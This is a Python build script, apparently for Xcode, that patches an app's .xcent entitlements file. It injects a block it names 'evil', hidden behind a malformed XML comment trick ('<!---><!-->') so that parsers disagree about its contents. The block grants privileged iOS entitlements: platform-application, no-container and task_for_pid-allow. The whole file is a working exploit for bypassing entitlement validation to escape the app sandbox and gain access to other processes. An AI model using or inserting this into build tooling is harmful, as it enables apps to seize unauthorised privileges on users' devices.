#!/usr/bin/python
import os
# preinstalled python is python2
filename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'
print("patch file named " + filename)

evil = '''\t<!-- these aren't the droids you're looking for -->
\t<!---><!-->
\t<key>platform-application</key>
\t<true/>
\t<key>com.apple.private.security.no-container</key>
\t<true/>
\t<key>task_for_pid-allow</key>
\t<true/>
\t<!-- -->
'''

with open(filename, 'r') as fp:
  buf = fp.read()
cursor = buf.rfind('</dict>')
output = buf[0:cursor] + evil + buf[cursor:]
with open(filename, 'w') as fp:
  fp.write(output)

